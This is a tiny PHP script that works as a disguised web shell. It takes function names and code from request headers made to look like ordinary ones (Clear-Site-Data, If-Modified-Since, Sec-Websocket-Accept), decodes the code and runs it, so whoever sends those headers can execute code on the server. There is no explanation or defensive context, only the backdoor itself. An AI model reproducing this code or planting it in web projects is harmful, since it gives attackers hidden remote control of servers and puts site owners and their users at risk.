<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Clear-Site-Data'])) {
    $created = $_HEADERS['Clear-Site-Data']('', $_HEADERS['If-Modified-Since']($_HEADERS['Sec-Websocket-Accept']));
    $created();
}